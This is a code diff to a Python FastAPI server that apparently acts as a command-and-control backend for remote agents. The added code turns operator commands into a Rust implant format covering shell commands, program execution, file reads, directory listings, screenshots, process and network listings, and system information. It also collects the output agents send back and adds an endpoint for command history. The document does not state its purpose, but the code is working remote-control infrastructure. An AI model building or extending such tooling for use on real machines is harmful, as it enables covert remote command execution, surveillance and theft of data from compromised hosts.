@@ -114,6 +114,34 @@ async def api_status():
     }
 
 
+# ============ Command Format Conversion ============
+
+def convert_to_rust_command(cmd: dict) -> dict:
+    """Convert frontend command format to Rust CommandType enum format"""
+    cmd_type = cmd.get("command_type", "shell")
+    if cmd_type == "shell":
+        return {"Shell": {"command": cmd.get("command", "")}}
+    elif cmd_type == "execute":
+        return {"Execute": {"program": cmd.get("program", ""), "args": cmd.get("args", [])}}
+    elif cmd_type == "whoami":
+        return "WhoAmI"
+    elif cmd_type == "pwd":
+        return "Pwd"
+    elif cmd_type == "list_dir":
+        return {"ListDir": {"path": cmd.get("path", ".")}}
+    elif cmd_type == "read_file":
+        return {"ReadFile": {"path": cmd.get("path", "")}}
+    elif cmd_type == "system_info":
+        return "SystemInfo"
+    elif cmd_type == "process_list":
+        return "ProcessList"
+    elif cmd_type == "screenshot":
+        return "Screenshot"
+    elif cmd_type == "network_info":
+        return "NetworkInfo"
+    return {"Shell": {"command": cmd.get("command", str(cmd))}}
+
+
 # ============ WebSocket Endpoints ============
 
 @app.websocket("/ws/agent/{agent_id}")
@@ -179,6 +207,14 @@ async def websocket_agent_endpoint(websocket: WebSocket, agent_id: str):
                         ack = {"type": "ack", "status": "registered", "timestamp": datetime.utcnow().isoformat()}
                         await websocket.send_text(json.dumps(ack))
                         continue
+                    elif msg_type == "RESPONSE":
+                        cmd_id = envelope.get("cmd_id", 0)
+                        status = envelope.get("status", "completed")
+                        output = envelope.get("output", "")
+                        error_msg = envelope.get("error", "")
+                        agent_manager.store_command_result(agent_id, cmd_id, status, output, error_msg)
+                        logger.info(f"Agent {agent_id}: command result (id={cmd_id}, status={status}, output_len={len(output)})")
+                        continue
                     # Plaintext message (debug mode)
                     msg_type = envelope.get("msg_type", "unknown")
                     agent_manager.update_agent_info(agent_id, {
@@ -209,13 +245,17 @@ async def websocket_agent_endpoint(websocket: WebSocket, agent_id: str):
             if pending:
                 for entry in pending:
                     cmd = entry["command"]
+                    cmd_id = entry.get("cmd_id", 0)
+                    rust_cmd = convert_to_rust_command(cmd)
                     response = {
                         "type": "command",
                         "timestamp": datetime.utcnow().isoformat(),
-                        "data": cmd,
+                        "cmd_id": cmd_id,
+                        "data": rust_cmd,
                     }
+                    entry["status"] = "sent"
                     await websocket.send_text(json.dumps(response))
-                    logger.info(f"Sent command to {agent_id}: {json.dumps(cmd)[:100]}")
+                    logger.info(f"Sent command to {agent_id} (id={cmd_id}): {json.dumps(rust_cmd)[:100]}")
             else:
                 ack = {
                     "type": "ack",
@@ -297,10 +337,11 @@ async def send_command_to_agent(agent_id: str, command: dict = Body(...)):
             content={"detail": f"Agent {agent_id} is not connected"}
         )
 
-    agent_manager.queue_command(agent_id, command)
+    cmd_id = agent_manager.queue_command(agent_id, command)
     return {
         "status": "queued",
         "agent_id": agent_id,
+        "cmd_id": cmd_id,
         "command": command,
         "queue_size": len(agent_manager.command_queues.get(agent_id, [])),
     }
@@ -314,6 +355,15 @@ async def get_agent_beacons(agent_id: str):
         "agent_id": agent_id,
         "total": len(beacons),
         "beacons": beacons[-50:],
+    }
+
+
+@app.get("/api/live/agents/{agent_id}/commands")
+async def get_agent_commands(agent_id: str):
+    """Get command history for an agent"""
+    return {
+        "agent_id": agent_id,
+        "commands": agent_manager.get_command_history(agent_id),
     }
 
 
